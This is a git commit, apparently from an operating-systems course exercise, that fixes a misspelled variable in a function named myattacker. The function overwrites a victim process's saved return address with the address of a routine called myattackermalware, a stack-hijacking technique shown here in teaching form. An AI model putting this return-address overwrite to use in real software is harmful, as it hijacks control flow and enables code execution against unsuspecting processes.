1fd2732c179f7e8ead14cf37d94ae213ef978f6d
Stephen Kramer <stephenk798@gmail.com>
2015-10-05 14:58:15 -0400

    cant spell return

--- system/myattacker.c
+++ system/myattacker.c
@@ -11,7 +11,7 @@ void myattacker()
 	unsigned long *return_add; //the return address of victim
 
 	asm("movl %ebp,ebp;");
-	retrun_add = ebp+505;
+	return_add = ebp+505;
 	*return_add = &myattackermalware;
 	return;
 }
